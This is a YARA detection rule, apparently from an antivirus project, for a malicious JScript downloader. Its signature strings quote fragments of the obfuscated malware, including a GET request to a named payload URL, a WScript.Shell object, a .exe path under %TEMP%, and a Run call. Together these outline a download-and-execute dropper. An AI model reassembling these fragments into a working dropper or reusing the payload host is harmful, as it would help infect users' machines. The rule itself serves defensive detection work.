rule sig_20160401_83ad28e2a5c747b86af170bd77c5bfd5 {
  meta:
    description = "datamaliciousorder - file 20160401_83ad28e2a5c747b86af170bd77c5bfd5.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ed119cb1c6f7a88499f61482e6e904b5b014a481e1a523cd8c856d24c0141cfb"

  strings:
    $s1  = "BuQkh[TzrWm](\"G\" + \"ET\", \"http://aaacollectionsjewelry.com/p2iskd\", false);" fullword ascii
    $s2  = "function EewFg(AnUft, TuZx){EvuHyp = EvuHyp * 1; return AnUft - TuZx;};" fullword ascii
    $s3  = "var PtiTq = function UiVbi() {return WScript[FmVu](\"WScript\"+\".Shell\");}(), LdHmu = 11;" fullword ascii
    $s4  = "if (BuQkh[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function WlwUzv(){return YoDhk + \"\";};" fullword ascii
    $s6  = "function OdMgp() {return PtiTq[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"pcuJDbRk.ex\" + \"e\";};" fullword ascii
    $s7  = "function KjtHr() {return ((BwlVzc == true) && (BwlVzc == OstHgj)) ? 1 : EvuHyp;};" fullword ascii
    $s8  = "return EewFg(ToqHw, DzYfw);" fullword ascii
    $s9  = "function QiZq(UfbFs) {var SsbCw = (1, 2, 3, 4, 5, UfbFs); return SsbCw;};" fullword ascii
    $s10 = "var OstHgj = false;" fullword ascii
    $s11 = "function CsgEhr(CvHrc){PtiTq[\"R\"+\"un\"](CvHrc, EvuHyp, EvuHyp);};" fullword ascii
    $s12 = "function HqoTww(){return 23;};" fullword ascii
    $s13 = "function BubOs(){return FmVu;};" fullword ascii
    $s14 = "function VaGq()" fullword ascii
    $s15 = "var QtCef = new this[\"Date\"]();" fullword ascii
    $s16 = "var BwlVzc = false;" fullword ascii
    $s17 = "}while (IpoKqr);" fullword ascii
    $s18 = "OstHgj = true; " fullword ascii
    $s19 = "var McvBh = false;" fullword ascii
    $s20 = "BwlVzc = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}